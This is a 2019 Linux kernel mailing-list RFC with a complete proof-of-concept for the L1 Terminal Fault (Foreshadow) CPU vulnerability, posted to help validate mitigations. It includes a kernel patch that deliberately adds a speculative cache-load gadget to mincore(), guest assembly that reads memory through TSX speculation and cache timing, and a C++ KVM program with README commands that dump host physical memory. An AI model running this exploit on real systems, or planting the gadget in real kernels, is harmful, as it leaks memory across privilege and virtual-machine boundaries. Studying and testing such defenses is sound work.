From: Julian Stecklina <jsteckli@amazon.de>
Subject: [RFC] x86/speculation: add L1 Terminal Fault / Foreshadow demo
Date: Mon, 21 Jan 2019 15:10:08 +0200
Message-Id: <1548076208-6442-1-git-send-email-jsteckli@amazon.de>
To: linux-kernel@vger.kernel.org
Cc: Julian Stecklina <jsteckli@amazon.de>, David Woodhouse <dwmw2@infradead.org>, Liran Alon <liran.alon@oracle.com>, Paolo Bonzini <pbonzini@redhat.com>, Andi Kleen <ak@linux.intel.com>, Thomas Gleixner <tglx@linutronix.de>, Linus Torvalds <torvalds@linux-foundation.org>, x86@kernel.org, Kernel Hardening <kernel-hardening@lists.openwall.com>
List-ID: <kernel-hardening.lists.openwall.com>

This is a proof-of-concept self-contained L1TF demonstrator that works
in the presence of the Linux kernel's default L1TF mitigation. This code
does by design not work on a vanilla Linux kernel. The purpose is to
help validate and improve defenses and not build a practical attack.

The Linux Kernel User's and Administrator's Guide describes two attack
scenarios for L1TF. The first is a malicious userspace application that
uses L1TF to leak data via left-over (but disabled) page table entries
in the kernel (CVE-2018-3620). The second is a malicious guest that
controls its own page table to leak arbitrary data from the L1
cache (CVE-2018-3646).

The demo combines both approaches. It is a malicious userspace
application that creates an ad-hoc virtual machine to leak memory.

It works by starting a cache loading thread that can be directed to
prefetch arbitrary memory by triggering a "cache load gadget". This is
any code in the kernel that accesses user controlled memory under
speculation. For the purpose of this demonstration, we've included a
patch to Linux to add such a gadget. Another thread is executing a tiny
bit of assembly in guest mode to perform the actual L1TF attack. These
threads are pinned to a hyperthread pair to make them share the L1
cache.

The README contains instructions on how to build and run the demo. See
also https://xenbits.xen.org/xsa/advisory-289.html for more context.

PS.

This patch is not necessarily meant to be committed to the Linux
repository. Posting it as a patch is just for convenient consumption via
email. If there is interest in actually adding this to the tree, I'm
happy to make it conform to the kernel coding style.

Cc: David Woodhouse <dwmw2@infradead.org>
Cc: Liran Alon <liran.alon@oracle.com>
Cc: Paolo Bonzini <pbonzini@redhat.com>
Cc: Andi Kleen <ak@linux.intel.com>
Cc: Thomas Gleixner <tglx@linutronix.de>
Cc: Linus Torvalds <torvalds@linux-foundation.org>
Cc: x86@kernel.org
Cc: Kernel Hardening <kernel-hardening@lists.openwall.com>
Cc: linux-kernel@vger.kernel.org

Signed-off-by: Julian Stecklina <jsteckli@amazon.de>
---
 ...of-of-concept-cache-load-gadget-in-mincor.patch |  53 +++
 tools/testing/l1tf/Makefile                        |  20 ++
 tools/testing/l1tf/README.md                       |  63 ++++
 tools/testing/l1tf/guest.asm                       | 146 ++++++++
 tools/testing/l1tf/ht-siblings.sh                  |   6 +
 tools/testing/l1tf/kvm.hpp                         | 191 ++++++++++
 tools/testing/l1tf/l1tf.cpp                        | 383 +++++++++++++++++++++
 7 files changed, 862 insertions(+)
 create mode 100644 tools/testing/l1tf/0001-XXX-Add-proof-of-concept-cache-load-gadget-in-mincor.patch
 create mode 100644 tools/testing/l1tf/Makefile
 create mode 100644 tools/testing/l1tf/README.md
 create mode 100644 tools/testing/l1tf/guest.asm
 create mode 100755 tools/testing/l1tf/ht-siblings.sh
 create mode 100644 tools/testing/l1tf/kvm.hpp
 create mode 100644 tools/testing/l1tf/l1tf.cpp

diff --git a/tools/testing/l1tf/0001-XXX-Add-proof-of-concept-cache-load-gadget-in-mincor.patch b/tools/testing/l1tf/0001-XXX-Add-proof-of-concept-cache-load-gadget-in-mincor.patch
new file mode 100644
index 0000000..a2ebe9c
--- /dev/null
+++ b/tools/testing/l1tf/0001-XXX-Add-proof-of-concept-cache-load-gadget-in-mincor.patch
@@ -0,0 +1,53 @@
+From 2d81948885c8e3e33f755a210257ff661710cbf8 Mon Sep 17 00:00:00 2001
+From: Julian Stecklina <jsteckli@amazon.de>
+Date: Tue, 13 Nov 2018 18:07:20 +0100
+Subject: [PATCH] XXX Add proof-of-concept cache load gadget in mincore()
+
+Instead of looking for a suitable gadget for L1TF, add one in the
+error-case of mincore().
+
+Signed-off-by: Julian Stecklina <jsteckli@amazon.de>
+---
+ mm/mincore.c | 25 ++++++++++++++++++++++++-
+ 1 file changed, 24 insertions(+), 1 deletion(-)
+
+diff --git a/mm/mincore.c b/mm/mincore.c
+index 4985965aa20a..8d6ac2e04920 100644
+--- a/mm/mincore.c
++++ b/mm/mincore.c
+@@ -229,8 +229,31 @@ SYSCALL_DEFINE3(mincore, unsigned long, start, size_t, len,
+ 	unsigned char *tmp;
+ 
+ 	/* Check the start address: needs to be page-aligned.. */
+-	if (start & ~PAGE_MASK)
++	if (start & ~PAGE_MASK) {
++
++		/*
++		 * XXX Hack
++		 *
++		 * We re-use this error case to show case a cache load gadget:
++		 * There is a mispredicted branch, which leads to prefetching
++		 * the cache with attacker controlled data.
++		 */
++		asm volatile (
++			/* Set up a misprediction */
++			"call 2f\n"
++
++			/* Prefetch data into cache and abort speculation */
++			"mov (%[ptr]), %%rax\n"
++			"pause\n"
++
++			/* Patch return address */
++			"2: movq $3f, (%%rsp)\n"
++			"ret\n"
++			"3:\n"
++			:: [ptr] "r" (vec));
++
+ 		return -EINVAL;
++	}
+ 
+ 	/* ..and we need to be passed a valid user-space range */
+ 	if (!access_ok(VERIFY_READ, (void __user *) start, len))
+-- 
+2.17.1
+
diff --git a/tools/testing/l1tf/Makefile b/tools/testing/l1tf/Makefile
new file mode 100644
index 0000000..84bede2
--- /dev/null
+++ b/tools/testing/l1tf/Makefile
@@ -0,0 +1,20 @@
+%.bin: %.asm
+	nasm -f bin -o $@ $<
+
+%.inc: %.bin
+	xxd -i < $< > $@
+
+SRCS=l1tf.cpp
+DEP=$(patsubst %.cpp,%.d,$(SRCS))
+
+GEN_HDRS=guest.inc
+
+l1tf: $(SRCS) $(GEN_HDRS)
+	g++ -MMD -MP -std=c++11 -O2 -g -pthread -o $@ $(SRCS)
+
+.PHONY: clean
+clean:
+	rm -f l1tf $(GEN_HDRS) $(DEP)
+
+-include $(DEP)
+
diff --git a/tools/testing/l1tf/README.md b/tools/testing/l1tf/README.md
new file mode 100644
index 0000000..12392bb
--- /dev/null
+++ b/tools/testing/l1tf/README.md
@@ -0,0 +1,63 @@
+## Overview
+
+This is a proof-of-concept self-contained L1TF demonstrator that works in the
+presence of the Linux kernel's default L1TF mitigation. This code does by design
+not work on a vanilla Linux kernel. The purpose is to help validate and improve
+defenses and not build a practical attack.
+
+The Linux Kernel User's and Administrator's Guide describes two attack scenarios
+for L1TF. The first is a malicious userspace application that uses L1TF to leak
+data via left-over (but disabled) page table entries in the kernel
+(CVE-2018-3620). The second is a malicious guest that controls its own page
+table to leak arbitrary data from the L1 cache (CVE-2018-3646).
+
+The demo combines both approaches. It is a malicious userspace application that
+creates an ad-hoc virtual machine to leak memory.
+
+It works by starting a cache loading thread that can be directed to prefetch
+arbitrary memory by triggering a "cache load gadget". This is any code in the
+kernel that accesses user controlled memory under speculation. For the purpose
+of this demonstration, we've included a patch to Linux to add such a gadget.
+Another thread is executing a tiny bit of assembly in guest mode to perform the
+actual L1TF attack. These threads are pinned to a hyperthread pair to make them
+share the L1 cache.
+
+See also https://xenbits.xen.org/xsa/advisory-289.html for more context.
+
+## Build Requirements
+
+- nasm
+- xxd
+- g++ >= 4.8.1
+- make
+
+## Execution Requirements
+
+- access to /dev/kvm
+- running kernel patched with 0001-XXX-Add-proof-of-concept-cache-load-gadget-in-mincor.patch
+- a vulnerable CPU that supports Intel TSX and Hyperthreading
+
+## Build
+
+```
+make
+```
+
+## Running
+
+To dump 1024 bytes of physical memory starting at 0xd0000, use the following call:
+
+./l1tf 0xffff888000000000 0xd0000 $(./ht-siblings.sh | head -n 1) 1024 > memory.dump
+
+The memory dump can be inspected via hexdump. The first parameter of the l1tf
+binary is the start of the linear mapping of all physical memory in the kernel.
+This is always 0xffff888000000000 for kernels without KASLR enabled.
+
+The code has been tested on Broadwell laptop and Kaby Lake desktop parts, other
+systems may require tweaking of MAX_CACHE_LATENCY in guest.asm.
+
+If the L1TF mechanism is not working, the tool typically returns all zeroes.
+
+## References
+
+[1] https://www.kernel.org/doc/html/latest/admin-guide/l1tf.html#default-mitigations
diff --git a/tools/testing/l1tf/guest.asm b/tools/testing/l1tf/guest.asm
new file mode 100644
index 0000000..9ede1b4
--- /dev/null
+++ b/tools/testing/l1tf/guest.asm
@@ -0,0 +1,146 @@
+; SPDX-License-Identifier: GPL-2.0
+; Copyright 2019 Amazon.com, Inc. or its affiliates.
+;
+; Author:
+;   Julian Stecklina <jsteckli@amazon.de>
+
+BITS 64
+ORG 0
+
+	; If memory accesses are faster than this number of cycles, we consider
+	; them cache hits. Works for Broadwell.
+	;
+	; Usage: touch mem-location
+	; Clobbers: RFLAGS
+%define MAX_CACHE_LATENCY 0xb0
+
+	; Touch a memory location without changing it. It ensures that A/D bits
+	; are set in both the guest page table and also in the EPT.
+%macro touch 1
+	lock add %1, 0
+%endmacro
+
+	; Measure the latency of accessing a specific memory location.
+	;
+	; Usage: measure output-reg, mem-location
+	; Clobbers: RAX, RDX, RCX, RFLAGS
+%macro measure 2
+	lfence
+	rdtscp
+	lfence
+
+	mov %1, eax
+	mov eax, %2
+
+	lfence
+	rdtscp
+	lfence
+
+	sub %1, eax
+	neg %1
+%endmacro
+
+
+SECTION text
+	; We enter here in 64-bit long mode with 1:1 paging in the low 1 GiB and
+	; a L1TF-prepared page table entry for the location in [RDI].
+entry:
+	; Set A/D bits for our page table's EPT entries and target addresses. We
+	; have 4 page table frames to touch.
+	mov rbx, cr3
+
+	touch dword [rbx]
+	touch dword [rbx + 0x1000]
+	touch dword [rbx + 0x2000]
+	touch dword [rbx + 0x3000]
+
+	mov dword [rel target0], 0
+	mov dword [rel target1], 0
+
+	; On VM entry, KVM might have cleared the L1D. Give the other thread a
+	; chance to run to repopulate it.
+	mov ecx, 1000
+slack_off:
+	pause
+	loop slack_off
+
+	; R8 keeps the current bit to test at [RDI]. R9 is where we reconstruct
+	; the value of the speculatively read [RDI]. R11 is the "sureness" bitmask.
+	xor r8d, r8d
+	xor r9d, r9d
+	xor r11d, r11d
+
+next_bit:
+	mov ecx, r8d
+
+	lea rbx, [target0]
+	lea r10, [target1]
+
+	clflush [rbx]
+	clflush [r10]
+
+	mfence
+	lfence
+
+	; Speculatively read [RDI] at bit RCX/R9 and touch either target0 or
+	; target1 depending on the content.
+	xbegin abort
+	bt [rdi], rcx
+	cmovc rbx, r10
+	lock inc dword [rbx]
+waitl:
+	; Pause always aborts the transaction.
+	pause
+	jmp waitl
+abort:
+
+	measure esi, [rbx]
+	cmp esi, MAX_CACHE_LATENCY
+	mov esi, 0
+	setb sil		; SIL -> Was target0 access cached?
+
+	measure ebx, [r10]
+	cmp ebx, MAX_CACHE_LATENCY
+	mov ebx, 0
+	setb bl			; BL -> Was target1 access cached?
+
+	; Remember the read bit in R9.
+	mov ecx, r8d
+	mov eax, ebx
+	shl eax, cl
+	or r9d, eax
+
+	shl ebx, 1
+	or esi, ebx
+
+	; ESI is now 0b10 if we read a sure 1 bit and 0b01 if we read a sure 0
+	; bit. The 0b01 case doesn't work well, unfortunately.
+	xor eax, eax
+	xor edx, edx
+	cmp esi, 0b10
+	sete al
+	cmp esi, 0b01
+	sete dl
+	or eax, edx
+	shl eax, cl
+	or r11d, eax
+
+	; Continue with the remaining bits.
+	inc r8d
+	cmp r8d, 32
+	jb next_bit
+
+	; Tell the VMM about the value that we read. The values are in R9 and
+	; R11.
+	xor eax, eax
+	out 0, eax
+
+	; We should never return after the OUT
+	ud2
+
+	; Use initialized data so our .bin file has the correct size
+SECTION .data
+
+ALIGN 4096
+target0: times 4096 db 0
+target1: times 4096 db 0
diff --git a/tools/testing/l1tf/ht-siblings.sh b/tools/testing/l1tf/ht-siblings.sh
new file mode 100755
index 0000000..8bdfe41
--- /dev/null
+++ b/tools/testing/l1tf/ht-siblings.sh
@@ -0,0 +1,6 @@
+#!/bin/sh
+
+set -e
+
+# Different kernels disagree on whether to use dashes or commas.
+sort /sys/devices/system/cpu/cpu*/topology/thread_siblings_list | sort -u | tr ',-' ' '
diff --git a/tools/testing/l1tf/kvm.hpp b/tools/testing/l1tf/kvm.hpp
new file mode 100644
index 0000000..38b3a95
--- /dev/null
+++ b/tools/testing/l1tf/kvm.hpp
@@ -0,0 +1,191 @@
+// SPDX-License-Identifier: GPL-2.0
+/*
+ * Copyright 2019 Amazon.com, Inc. or its affiliates.
+ *
+ * Author:
+ *   Julian Stecklina <jsteckli@amazon.de>
+ *
+ */
+
+#pragma once
+
+#include <cstdio>
+#include <cstdint>
+#include <cstdlib>
+#include <linux/kvm.h>
+#include <unistd.h>
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <sys/ioctl.h>
+#include <sys/mman.h>
+#include <fcntl.h>
+#include <vector>
+
+inline void die_on(bool is_failure, const char *name)
+{
+  if (is_failure) {
+    perror(name);
+    exit(EXIT_FAILURE);
+  }
+}
+
+/* A convencience RAII wrapper around file descriptors */
+class fd_wrapper
+{
+  int fd_;
+  bool invalidated = false;
+public:
+  int fd() const { return fd_; }
+
+  fd_wrapper(int fd)
+    : fd_(fd)
+  {
+    die_on(fd_ < 0, "fd create");
+  }
+
+  fd_wrapper(const char *fname, int flags)
+    : fd_(open(fname, flags))
+  {
+    die_on(fd_ < 0, "open");
+  }
+
+  fd_wrapper(fd_wrapper &&other)
+    : fd_(other.fd())
+  {
+    /* Prevent double close */
+    other.invalidated = true;
+  }
+
+  /* Can't copy this class only move it. */
+  fd_wrapper(fd_wrapper const &) = delete;
+
+  ~fd_wrapper()
+  {
+    if (not invalidated)
+      die_on(close(fd_) < 0, "close");
+  }
+};
+
+class kvm_vcpu {
+  fd_wrapper vcpu_fd;
+
+  size_t vcpu_mmap_size_;
+  kvm_run *run_;
+
+public:
+  kvm_vcpu(kvm_vcpu const &) = delete;
+  kvm_vcpu(kvm_vcpu &&) = default;
+
+  kvm_run *get_state() { return run_; }
+
+  void run()
+  {
+    die_on(ioctl(vcpu_fd.fd(), KVM_RUN, 0) < 0, "KVM_RUN");
+  }
+
+  kvm_regs get_regs()
+  {
+    kvm_regs regs;
+    die_on(ioctl(vcpu_fd.fd(), KVM_GET_REGS, &regs) < 0, "KVM_GET_REGS");
+    return regs;
+  }
+
+  kvm_sregs get_sregs()
+  {
+    kvm_sregs sregs;
+    die_on(ioctl(vcpu_fd.fd(), KVM_GET_SREGS, &sregs) < 0, "KVM_GET_SREGS");
+    return sregs;
+  }
+
+  void set_regs(kvm_regs const &regs)
+  {
+    die_on(ioctl(vcpu_fd.fd(), KVM_SET_REGS, &regs) < 0, "KVM_SET_REGS");
+  }
+
+  void set_sregs(kvm_sregs const &sregs)
+  {
+    die_on(ioctl(vcpu_fd.fd(), KVM_SET_SREGS, &sregs) < 0, "KVM_SET_SREGS");
+  }
+
+
+  void set_cpuid(std::vector<kvm_cpuid_entry2> const &entries)
+  {
+    char backing[sizeof(kvm_cpuid2) + entries.size()*sizeof(kvm_cpuid_entry2)] {};
+    kvm_cpuid2 *leafs = reinterpret_cast<kvm_cpuid2 *>(backing);
+    int rc;
+
+    leafs->nent = entries.size();
+    std::copy_n(entries.begin(), entries.size(), leafs->entries);
+    rc = ioctl(vcpu_fd.fd(), KVM_SET_CPUID2, leafs);
+    die_on(rc != 0, "ioctl(KVM_SET_CPUID2)");
+  }
+
+  kvm_vcpu(int fd, size_t mmap_size)
+    : vcpu_fd(fd), vcpu_mmap_size_(mmap_size)
+  {
+    run_ = static_cast<kvm_run *>(mmap(nullptr, mmap_size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0));
+    die_on(run_ == MAP_FAILED, "mmap");
+  }
+
+  ~kvm_vcpu()
+  {
+    die_on(munmap(run_, vcpu_mmap_size_) < 0, "munmap");
+  }
+};
+
+/* A convencience RAII wrapper around /dev/kvm. */
+class kvm {
+  fd_wrapper dev_kvm { "/dev/kvm", O_RDWR };
+  fd_wrapper vm { ioctl(dev_kvm.fd(), KVM_CREATE_VM, 0) };
+
+  int memory_slots_ = 0;
+
+public:
+
+  size_t get_vcpu_mmap_size()
+  {
+    int size = ioctl(dev_kvm.fd(), KVM_GET_VCPU_MMAP_SIZE);
+
+    die_on(size < 0, "KVM_GET_VCPU_MMAP_SIZE");
+    return (size_t)size;
+  }
+
+  void add_memory_region(uint64_t gpa, uint64_t size, void *backing, bool readonly = false)
+  {
+    int rc;
+    const kvm_userspace_memory_region slotinfo {
+      (uint32_t)memory_slots_,
+        (uint32_t)(readonly ? KVM_MEM_READONLY : 0),
+        gpa, size, (uintptr_t)backing,
+        };
+
+    rc = ioctl(vm.fd(), KVM_SET_USER_MEMORY_REGION, &slotinfo);
+    die_on(rc < 0, "KVM_SET_USER_MEMORY_REGION");
+
+    memory_slots_++;
+  }
+
+  void add_memory_region(uint64_t gpa, uint64_t size, void const *backing)
+  {
+    add_memory_region(gpa, size, const_cast<void *>(backing), true);
+  }
+
+  kvm_vcpu create_vcpu(int apic_id)
+  {
+    return { ioctl(vm.fd(), KVM_CREATE_VCPU, apic_id), get_vcpu_mmap_size() };
+  }
+
+  std::vector<kvm_cpuid_entry2> get_supported_cpuid()
+  {
+    const size_t max_cpuid_leafs = 128;
+    char backing[sizeof(kvm_cpuid2) + max_cpuid_leafs*sizeof(kvm_cpuid_entry2)] {};
+    kvm_cpuid2 *leafs = reinterpret_cast<kvm_cpuid2 *>(backing);
+    int rc;
+		
+    leafs->nent = max_cpuid_leafs;
+    rc = ioctl(dev_kvm.fd(), KVM_GET_SUPPORTED_CPUID, leafs);
+    die_on(rc != 0, "ioctl(KVM_GET_SUPPORTED_CPUID)");
+
+    return { &leafs->entries[0], &leafs->entries[leafs->nent] };
+  }
+};
diff --git a/tools/testing/l1tf/l1tf.cpp b/tools/testing/l1tf/l1tf.cpp
new file mode 100644
index 0000000..4a7fdd7
--- /dev/null
+++ b/tools/testing/l1tf/l1tf.cpp
@@ -0,0 +1,383 @@
+// SPDX-License-Identifier: GPL-2.0
+/*
+ * Copyright 2019 Amazon.com, Inc. or its affiliates.
+ *
+ * Author:
+ *   Julian Stecklina <jsteckli@amazon.de>
+ *
+ */
+
+#include <algorithm>
+#include <atomic>
+#include <cstdlib>
+#include <cstring>
+#include <thread>
+#include <array>
+#include <utility>
+#include <iomanip>
+#include <iostream>
+
+#include <errno.h>
+
+#include "kvm.hpp"
+
+/* This code is mapped into the guest at GPA 0. */
+static unsigned char guest_code[] alignas(4096) {
+#include "guest.inc"
+};
+
+/* Hardcoded I/O port where we get cache line access timings from the guest */
+static const uint16_t guest_result_port = 0;
+
+static const uint64_t page_size = 4096;
+
+struct value_pair {
+  uint32_t value;
+  uint32_t sureness;
+};
+
+/*
+ * Create a memory region for KVM that contains a set of page tables. These page
+ * tables establish a 1 GB identity mapping at guest-virtual address 0.
+ *
+ * We need a single page for every level of the paging hierarchy.
+ */
+class page_table {
+  const uint64_t page_pws = 0x63; /* present, writable, system, dirty, accessed */
+  const uint64_t page_large = 0x80; /* large page */
+
+  const size_t tables_size_ = 4 * page_size;
+  uint64_t gpa_;		/* GPA of page tables */
+  uint64_t *tables_;
+
+  /*
+   * Helper functions to get pointers to different levels of the paging
+   * hierarchy.
+   */
+  uint64_t *pml4() { return tables_; }
+  uint64_t *pdpt() { return tables_ + 1 * page_size/sizeof(uint64_t); }
+  uint64_t *pd()   { return tables_ + 2 * page_size/sizeof(uint64_t); }
+  uint64_t *pt()   { return tables_ + 3 * page_size/sizeof(uint64_t); }
+
+public:
+
+  /*
+   * Return the guest-virtual address at which set_victim_pa() prepared
+   * the page tables for an L1TF attack.
+   */
+  uint64_t get_victim_gva(uint64_t pa) const
+  {
+    return (pa & (page_size - 1)) | (1UL << 30);
+  }
+
+  /*
+   * Set up the page tables for an L1TF attack to leak the _host_ physical
+   * address pa.
+   */
+  void set_victim_pa(uint64_t pa) { pt()[0] = (pa & ~(page_size - 1)) | 0x60; }
+
+  page_table(kvm *kvm, uint64_t gpa)
+    : gpa_(gpa)
+  {
+    die_on(gpa % page_size != 0, "Page table GPA not aligned");
+
+    tables_ = static_cast<uint64_t *>(aligned_alloc(page_size, tables_size_));
+    die_on(tables_ == nullptr, "aligned_alloc");
+    memset(tables_, 0, tables_size_);
+
+    /* Create a 1:1 mapping for the low GB */
+    pml4()[0] = (gpa + page_size) | page_pws;
+    pdpt()[0] = 0 | page_pws | page_large;
+
+    /* Create a mapping for the victim address */
+    pdpt()[1] = (gpa + 2*page_size) | page_pws;
+    pd()[0] = (gpa + 3*page_size)| page_pws;
+    pt()[0] = 0;	/* Will be filled in by set_victim_pa */
+
+    kvm->add_memory_region(gpa, tables_size_, tables_);
+  }
+
+  ~page_table()
+  {
+    /*
+     * XXX We would need to remove the memory region here, but we
+     * only end up here when we destroy the whole VM.
+     */
+    free(tables_);
+  }
+};
+
+/*
+ * Set up a minimal KVM VM in long mode and execute an L1TF attack from inside
+ * of it.
+ */
+class l1tf_leaker {
+  /* Page tables are located after guest code. */
+  uint64_t const page_table_base = sizeof(guest_code);
+
+  kvm kvm_;
+  kvm_vcpu vcpu_ { kvm_.create_vcpu(0) };
+  page_table page_table_ { &kvm_, page_table_base };
+
+  /*
+   * RDTSCP is used for exact timing measurements from guest mode. We need
+   * to enable it in CPUID for KVM to expose it.
+   */
+  void enable_rdtscp()
+  {
+    auto cpuid_leafs = kvm_.get_supported_cpuid();
+    auto ext_leaf = std::find_if(cpuid_leafs.begin(), cpuid_leafs.end(),
+				 [] (kvm_cpuid_entry2 const &leaf) {
+				   return leaf.function == 0x80000001U;
+				 });
+
+    die_on(ext_leaf == cpuid_leafs.end(), "find(rdtscp leaf)");
+
+    ext_leaf->edx = 1UL << 27 /* RDTSCP */;
+
+    vcpu_.set_cpuid(cpuid_leafs);
+  }
+
+  /*
+   * Set up the control and segment register state to enter 64-bit mode
+   * directly.
+   */
+  void enable_long_mode()
+  {
+    auto sregs = vcpu_.get_sregs();
+
+    /* Set up 64-bit long mode */
+    sregs.cr0  = 0x80010013U;
+    sregs.cr2  = 0;
+    sregs.cr3  = page_table_base;
+    sregs.cr4  = 0x00000020U;
+    sregs.efer = 0x00000500U;
+
+    /* 64-bit code segment */
+    sregs.cs.base = 0;
+    sregs.cs.selector = 0x8;
+    sregs.cs.type = 0x9b;
+    sregs.cs.present = 1;
+    sregs.cs.s = 1;
+    sregs.cs.l = 1;
+    sregs.cs.g = 1;
+
+    /* 64-bit data segments */
+    sregs.ds = sregs.cs;
+    sregs.ds.type = 0x93;
+    sregs.ds.selector = 0x10;
+
+    sregs.ss = sregs.es = sregs.fs = sregs.gs = sregs.ds;
+
+    vcpu_.set_sregs(sregs);
+  }
+
+public:
+
+  /*
+   * Try to leak 32-bits host physical memory and return the data in
+   * addition to per-bit information on whether we are sure about the
+   * values.
+   */
+  value_pair try_leak_dword(uint64_t phys_addr)
+  {
+    auto state = vcpu_.get_state();
+
+    page_table_.set_victim_pa(phys_addr);
+
+    kvm_regs regs {};
+
+    regs.rflags = 2; /* reserved bit */
+    regs.rdi = page_table_.get_victim_gva(phys_addr);
+    regs.rip = 0;
+
+    vcpu_.set_regs(regs);
+    vcpu_.run();
+
+    regs = vcpu_.get_regs();
+
+    die_on(state->exit_reason != KVM_EXIT_IO or
+	   state->io.port != guest_result_port or
+	   state->io.size != 4, "unexpected exit");
+
+    return { (uint32_t)regs.r9, (uint32_t)regs.r11 };
+  }
+
+  l1tf_leaker()
+  {
+    kvm_.add_memory_region(0, sizeof(guest_code), guest_code);
+
+    enable_rdtscp();
+    enable_long_mode();
+  }
+};
+
+/* Set the scheduling affinity for the calling thread. */
+static void set_cpu(int cpu)
+{
+  cpu_set_t cpuset;
+
+  CPU_ZERO(&cpuset);
+  CPU_SET(cpu, &cpuset);
+
+  int rc = pthread_setaffinity_np(pthread_self(), sizeof(cpuset), &cpuset);
+
+  die_on(rc != 0, "pthread_setaffinity_np");
+}
+
+/*
+ * Attempt to prefetch specific memory into the cache. This data can then be
+ * leaked via L1TF on the hyperthread sibling.
+ */
+class cache_loader {
+  int cpu_;
+  uint64_t page_base_offset_;
+
+  std::atomic<uint64_t> target_kva_ {0};
+  std::thread prime_thread;
+
+  void cache_prime_thread()
+  {
+    set_cpu(cpu_);
+
+    while (true) {
+      uint64_t kva = target_kva_;
+
+      if (kva == ~0ULL)
+	break;
+
+      /*
+       * This relies on a deliberately placed cache load gadget in the
+       * kernel. A real exploit would of course use an existing
+       * gadget.
+       */
+      int rc = mincore((void *)1, 0, (unsigned char *)kva);
+      die_on(rc == 0 || errno != EINVAL, "mincore");
+    };
+  }
+
+public:
+
+  /* Set the physical address that should be prefetched into the cache. */
+  void set_phys_address(uint64_t pa)
+  {
+    target_kva_ = pa + page_base_offset_;
+  }
+
+
+  cache_loader(int cpu, uint64_t page_base_offset)
+    : cpu_(cpu), page_base_offset_(page_base_offset),
+      prime_thread { [this] { cache_prime_thread(); } }
+  {}
+
+  ~cache_loader()
+  {
+    /* Ask the thread to exit. */
+    target_kva_ = ~0ULL;
+    prime_thread.join();
+  }
+};
+
+/*
+ * Given a set of values and bit masks, which bits are probably correct,
+ * reconstruct the original value.
+ */
+class value_reconstructor {
+  std::array<std::pair<int, int>, 32> freq {};
+
+public:
+  void record_attempt(value_pair const &e)
+  {
+    for (int bit_pos = 0; bit_pos < 32; bit_pos++) {
+      uint32_t mask = 1U << bit_pos;
+
+      if (not (e.sureness & mask))
+	continue;
+
+      (e.value & mask ? freq[bit_pos].second : freq[bit_pos].first)++;
+    }
+  }
+
+  /* Reconstruct a value from the most frequently seen bit values. */
+  uint32_t get_most_likely_value() const
+  {
+    uint32_t reconstructed = 0;
+
+    for (int bit_pos = 0; bit_pos < 32; bit_pos++) {
+      if (freq[bit_pos].second > freq[bit_pos].first)
+	reconstructed |= (1U << bit_pos);
+    }
+
+    return reconstructed;
+  }
+
+};
+
+/*
+ * Parse a 64-bit integer from a string that may contain 0x to indicate
+ * hexadecimal.
+ */
+static uint64_t from_hex_string(const char *s)
+{
+  return std::stoull(s, nullptr, 0);
+}
+
+int main(int argc, char **argv)
+{
+  if (argc != 6 and argc != 5) {
+    std::cerr << "Usage: l1tf-exploit page-offset-base phys-addr ht-0 ht-1 [size]\n";
+    return EXIT_FAILURE;
+  }
+
+  if (isatty(STDOUT_FILENO)) {
+    std::cerr << "Refusing to write binary data to tty. Please pipe output into hexdump.\n";
+    return EXIT_FAILURE;
+  }
+
+  uint64_t page_offset_base = from_hex_string(argv[1]);
+  uint64_t phys_addr = from_hex_string(argv[2]);
+  int ht_0 = from_hex_string(argv[3]);
+  int ht_1 = from_hex_string(argv[4]);
+  uint64_t size = (argc == 6) ? from_hex_string(argv[5]) : 256;
+
+  /* Start prefetching data into the L1 cache from the given hyperthread. */
+  cache_loader loader { ht_0, page_offset_base };
+
+  /* Place the main on the hyperthread sibling so we share the L1 cache. */
+  l1tf_leaker leaker;
+  set_cpu(ht_1);
+
+  /* Read physical memory 32-bit at a time. */
+  for (uint64_t offset = 0; offset < size; offset += 4) {
+    uint64_t phys = offset + phys_addr;
+    uint32_t leaked_value = 0;
+
+    /*
+     * Direct the cache loader on the other thread to start prefetching a new
+     * address.
+     */
+    loader.set_phys_address(phys);
+
+    /*
+     * We can't differentiate between reading 0 and failure, so retry a couple
+     * of times to see whether we get anything != 0.
+     */
+    for (int tries = 32; not leaked_value and tries; tries--) {
+      value_reconstructor reconstructor;
+
+      /*
+       * Read each value multiple times and then reconstruct the likely original
+       * value by voting.
+       */
+      for (int i = 0; i < 16; i++)
+	reconstructor.record_attempt(leaker.try_leak_dword(phys));
+
+      leaked_value = reconstructor.get_most_likely_value();
+    }
+
+    std::cout.write((const char *)&leaked_value, sizeof(leaked_value));
+    std::cout.flush();
+  }
+
+  return 0;
+}
-- 
2.7.4
